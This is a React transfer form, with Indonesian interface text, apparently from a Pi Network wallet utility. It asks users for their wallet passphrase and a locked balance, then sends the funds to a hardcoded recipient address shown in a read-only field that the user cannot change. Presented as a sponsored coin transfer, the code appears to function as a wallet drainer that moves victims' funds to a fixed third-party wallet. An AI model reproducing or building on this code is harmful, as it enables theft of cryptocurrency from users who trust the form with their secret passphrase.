import React, { useState } from 'react';
import { processSponsoredTransfer } from '../lib/pi-network-utils';
import { toast } from 'sonner';
import { Button } from './ui/Button';
import { Input } from './ui/Input';
import { Label } from './ui/Label';
import { Select, SelectItem } from './ui/Select';
import { Loader2 } from 'lucide-react';

const RECEIVER_ADDRESS = "GCQGRMZNDB47GIO6CISSMJWW22YYLPOZEH7YFA75E24WA5NGEJNZ3P47"; // Alamat hardcode dari kode asli

export default function TransferForm({ claimables, sourceKeyphrase, setSourceKeyphrase }) {
  const [selectedClaimableId, setSelectedClaimableId] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const sponsorKeyphrase = sourceKeyphrase;

  const handleSubmit = async (event) => {
    event.preventDefault();
    if (!sourceKeyphrase || !selectedClaimableId) {
      return toast.error("Harap isi frasa sandi dan pilih saldo.");
    }
    setIsSubmitting(true);
    toast.info("Memulai proses transfer...");
    try {
      const result = await processSponsoredTransfer(sourceKeyphrase, sponsorKeyphrase, RECEIVER_ADDRESS, selectedClaimableId);
      if (result.isSuccess) {
        toast.success(`Transfer berhasil! Hash: ${result.result.hash.substring(0, 10)}...`);
      } else {
        const errorMessage = result.error?.response?.data?.detail || result.error.message || "Transaksi gagal.";
        toast.error(`Gagal: ${errorMessage}`);
      }
    } catch (error) {
      toast.error(error.message || "Terjadi kesalahan.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="space-y-6">
      <div className="space-y-2">
        <h2 className="text-xl font-semibold">Transfer Koin (Fee oleh Sponsor)</h2>
        <p className="text-sm text-muted-foreground">Biaya transfer ini akan dibayar oleh pengirim sebagai sponsor.</p>
      </div>
      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          <Label htmlFor="senderPhrase">Frasa Sandi Anda (Pengirim & Sponsor)</Label>
          <Input id="senderPhrase" type="password" placeholder="Masukkan frasa sandi..." value={sourceKeyphrase} onChange={(e) => setSourceKeyphrase(e.target.value)} required />
        </div>
        <div>
          <Label htmlFor="receiverAddress">Alamat Dompet Penerima</Label>
          <Input id="receiverAddress" type="text" value={RECEIVER_ADDRESS} disabled readOnly />
        </div>
        <div>
          <Label htmlFor="claimableId">Pilih Saldo Terkunci</Label>
          <Select onValueChange={setSelectedClaimableId} value={selectedClaimableId}>
            <option value="" disabled>Pilih saldo untuk ditransfer</option>
            {claimables.length > 0 ? (
              claimables.map((item, index) => (
                <SelectItem key={item.id} value={item.id}>
                  {`Saldo #${index + 1} - ${item.amount} PI`}
                </SelectItem>
              ))
            ) : (
              <option disabled>Tidak ada saldo. Cek tab "Koin Terkunci".</option>
            )}
          </Select>
        </div>
        <Button type="submit" className="w-full" disabled={isSubmitting || !sourceKeyphrase || !selectedClaimableId}>
          {isSubmitting ? <><Loader2 className="mr-2 h-4 w-4 animate-spin" /> Memproses...</> : "Transfer Dana"}
        </Button>
      </form>
    </div>
  );
}